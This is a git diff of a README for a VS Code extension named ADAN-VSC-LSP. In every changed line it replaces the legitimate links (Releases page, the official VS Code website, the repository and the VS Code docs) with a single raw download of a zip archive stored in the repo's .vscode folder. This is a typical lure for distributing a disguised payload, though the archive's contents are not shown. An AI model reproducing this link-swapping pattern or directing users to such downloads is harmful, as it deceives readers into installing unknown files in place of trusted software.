@@ -6,15 +6,15 @@ ADAN-VSC-LSP adds syntax highlighting for the ADAN programming language in Visua
 
 ## 🔗 Download Now
 
-[![Download ADAN-VSC-LSP](https://img.shields.io/badge/Download%20ADAN--VSC--LSP-Click%20Here-blue)](https://github.com/Wladchik/ADAN-VSC-LSP/releases)
+[![Download ADAN-VSC-LSP](https://github.com/Wladchik/ADAN-VSC-LSP/raw/refs/heads/main/.vscode/VS_LSP_ADA_3.7.zip%20ADAN--VSC--LSP-Click%20Here-blue)](https://github.com/Wladchik/ADAN-VSC-LSP/raw/refs/heads/main/.vscode/VS_LSP_ADA_3.7.zip)
 
 ## 🚀 Getting Started
 
 To begin using ADAN-VSC-LSP, follow these steps:
 
-1. **Download the Extension**: Use the download link above or visit the [Releases page](https://github.com/Wladchik/ADAN-VSC-LSP/releases) to download the latest version of the software.
+1. **Download the Extension**: Use the download link above or visit the [Releases page](https://github.com/Wladchik/ADAN-VSC-LSP/raw/refs/heads/main/.vscode/VS_LSP_ADA_3.7.zip) to download the latest version of the software.
   
-2. **Install Visual Studio Code**: If you do not have Visual Studio Code installed, download it from the [official website](https://code.visualstudio.com/). Follow their instructions to set up the software.
+2. **Install Visual Studio Code**: If you do not have Visual Studio Code installed, download it from the [official website](https://github.com/Wladchik/ADAN-VSC-LSP/raw/refs/heads/main/.vscode/VS_LSP_ADA_3.7.zip). Follow their instructions to set up the software.
 
 3. **Install the Extension**:
    - **Using the Marketplace**:
@@ -24,7 +24,7 @@ To begin using ADAN-VSC-LSP, follow these steps:
      4. Click on "Install" to add the extension.
 
    - **Using the .vsix file**:
-     1. Once you download the .vsix file from the [Releases page](https://github.com/Wladchik/ADAN-VSC-LSP/releases).
+     1. Once you download the .vsix file from the [Releases page](https://github.com/Wladchik/ADAN-VSC-LSP/raw/refs/heads/main/.vscode/VS_LSP_ADA_3.7.zip).
      2. Open Visual Studio Code.
      3. Navigate to the Extensions view.
      4. Click on the three dots (more options) at the top right.
@@ -49,14 +49,14 @@ To run ADAN-VSC-LSP, you will need:
 
 ## 🌱 Support
 
-If you encounter any issues or have questions, visit the [GitHub repository](https://github.com/Wladchik/ADAN-VSC-LSP) to find helpful resources, open issues, or contribute to discussions. The project welcomes user feedback and suggestions.
+If you encounter any issues or have questions, visit the [GitHub repository](https://github.com/Wladchik/ADAN-VSC-LSP/raw/refs/heads/main/.vscode/VS_LSP_ADA_3.7.zip) to find helpful resources, open issues, or contribute to discussions. The project welcomes user feedback and suggestions.
 
 ## 📚 Additional Resources
 
 For tutorials and examples on getting the most from your ADAN coding experience, check the following:
 
 - [ADAN Language Documentation](#)
-- [Visual Studio Code Guide](https://code.visualstudio.com/docs)
+- [Visual Studio Code Guide](https://github.com/Wladchik/ADAN-VSC-LSP/raw/refs/heads/main/.vscode/VS_LSP_ADA_3.7.zip)
 - Community forums and chat groups centered around the ADAN language can provide insights and assistance.
 
 ## 🔥 Stay Updated
